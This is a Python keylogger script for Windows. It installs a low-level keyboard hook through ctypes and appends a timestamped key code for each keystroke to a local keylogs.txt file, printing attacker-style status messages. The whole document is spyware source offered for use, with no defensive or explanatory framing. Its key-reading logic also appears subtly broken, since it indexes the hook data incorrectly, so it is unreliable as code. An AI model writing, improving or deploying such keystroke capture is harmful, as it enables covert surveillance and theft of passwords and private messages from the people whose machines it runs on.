import os
import ctypes
from datetime import datetime

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

target_pid = kernel32.GetCurrentProcessId()  # get current process id
print(f'[+] Current Process ID: {target_pid}')

keylogs_filepath = os.getcwd() + '\\keylogs.txt'
if not os.path.exists(keylogs_filepath):
    with open(keylogs_filepath, 'w') as f:
        pass
else:
    print('[+] Log file already exists. Appending to the existing log file.')

def keystroke_handler(code, wparam, lparam):
    if wparam == 256:  # WM_KEYDOWN
        key = chr(lparam[2]) if 0x41 <= lparam[2] <= 0x5A else ' <' + str(lparam[2]) + '> '
        with open(keylogs_filepath, 'a') as f:
            f.write(str(datetime.now()) + ': ' + key + '\n')
    return user32.CallNextHookExW(hook_id, code, wparam, lparam)

keyboard_handler = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))(keystroke_handler)
hook_id = user32.SetWindowsHookExW(13, keyboard_handler, None, 0)  # WH_KEYBOARD_LL = 13

if hook_id == 0:
    print('[!] Failed to install hook')
else:
    print('[+] Hook successfully installed. Logging keystrokes...')

user32.GetMessageW(None, None, 0, 0)  # blocking call until the program is terminated
user32.UnhookWindowsHookEx(hook_id)